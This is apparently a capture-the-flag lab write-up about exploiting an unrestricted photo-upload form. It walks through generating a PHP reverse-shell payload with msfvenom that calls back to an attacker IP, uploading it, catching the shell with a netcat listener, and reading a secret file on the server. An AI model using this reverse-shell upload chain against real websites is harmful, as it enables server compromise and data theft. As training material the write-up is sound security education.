# Challenge #1 - Tomato Lovers 1

## Objective

- There is a possibility to upload photos within the website.
- Your objective is to determine which type of files can be uploaded and whether they cause any security threat to the website security.
- In order to prove the threat, you should upload a file that lets you run PHP commands on the server.
- You will find a secret in the file readthissecret.php in the website root

## What you will learn

- How to find and exploit vulnerable upload forms
- How to determine the impact related to an Unrestricted File Upload vulnerability
- How to write your own PHP Shell

## Steps

Craft a php shell to upload. Replace the IP with your own VPN IP. The extension must be a valid

```bash
msfvenom -p php/reverse_php lhost=10.100.13.200 lport=1234 -o shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3007 bytes
Saved as: shell.php
```

Upload this filea on the photo section.

```
http://1.challenge.fileres.site/index.php?section=photos
```

Open a terminal and start a netcat session.

```
nc -nvlp 1234
```

Request your file on the uploads page

```
http://1.challenge.fileres.site/uploads/shell.php
```

On your new shell session read the secret file.

```html
cat ../readthissecret.php
<?php

// YOUR SECRET IS: Congratulations!

?>
```